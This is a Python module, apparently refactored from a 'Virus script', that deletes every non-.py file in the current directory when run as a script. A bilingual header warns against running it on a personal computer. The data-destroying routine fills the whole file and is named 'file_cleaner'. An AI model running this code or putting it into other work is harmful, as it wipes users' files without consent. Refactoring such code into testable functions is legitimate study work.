# ----------------------------------------------------------
# UYARI: Bu modulu kisisel bilgisayarinizda calistirmayin!
# WARNING: Never run this module on your personal computer!
# ----------------------------------------------------------

"""
file_cleaner -- core logic for listing, filtering, and removing files.

This module extracts the logic from the original Virus script into
testable functions.  Nothing is executed on import; call ``clean()``
or ``main()`` explicitly.
"""

import os
from typing import List, Tuple


def list_files(directory: str = ".") -> List[str]:
    """Return the list of entries in *directory*."""
    return os.listdir(directory)


def filter_non_py(files: List[str]) -> List[str]:
    """Return only the entries that do **not** end with ``.py``."""
    return [f for f in files if not f.endswith(".py")]


def remove_file(filepath: str) -> Tuple[bool, str]:
    """Try to remove *filepath*.

    Returns ``(True, message)`` on success and ``(False, message)`` on
    failure.
    """
    try:
        os.remove(filepath)
        return True, f"{filepath} silindi \u2713"
    except IsADirectoryError:
        return False, f"{filepath} bir klasor, atlandi \u2717"
    except PermissionError:
        return False, f"{filepath} izin hatasi, atlandi \u2717"
    except Exception as e:
        return False, f"{filepath} silinemedi: {e}"


def clean(directory: str = ".") -> List[Tuple[str, bool, str]]:
    """Run the full clean cycle in *directory*.

    Returns a list of ``(filename, success, message)`` tuples -- one
    per non-``.py`` file found.
    """
    files = list_files(directory)
    targets = filter_non_py(files)
    results: List[Tuple[str, bool, str]] = []
    for target in targets:
        path = os.path.join(directory, target) if directory != "." else target
        success, msg = remove_file(path)
        print(msg)
        results.append((target, success, msg))
    print("Islem tamamlandi!")
    return results


def main() -> None:
    """Entry-point that mirrors the original script behaviour."""
    clean(".")


if __name__ == "__main__":
    main()
